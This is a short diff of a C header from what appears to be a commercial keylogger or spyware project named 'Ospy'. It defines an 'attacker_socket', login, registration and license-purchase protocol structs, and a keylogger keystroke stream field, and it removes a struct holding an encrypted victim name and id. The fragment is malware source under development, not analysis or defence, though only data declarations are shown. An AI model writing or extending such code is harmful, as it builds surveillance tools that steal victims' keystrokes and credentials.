@@ -61,11 +61,6 @@ int attacker_socket; // global value
 //protocols//
 
 typedef struct {
-	char victim_name[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
-	char id[HASH_LEN];
-} encrypted_log_in_vicitm_protocol;
-
-typedef struct {
 	char username[MAX_USER_NAME_LEN];
 	char password[MAX_PASSWORD_LEN];
 } log_in_protocol;
@@ -117,7 +112,6 @@ typedef union{
 
 typedef union{
 	encrypted_log_in_protocol encrypted_login_to_Ospy;
-	encrypted_log_in_vicitm_protocol encrypted_login_vicim_to_Ospy;
 	encrypted_register_protocol encrypted_register_to_Ospay;
 	encrypted_buying_license_key_protocol encrypted_buy_license_key;
 	char keylogger_stream_key[ENCRYPTED_TEXT_LEN(MAX_KEYSTROKE_LEN)];
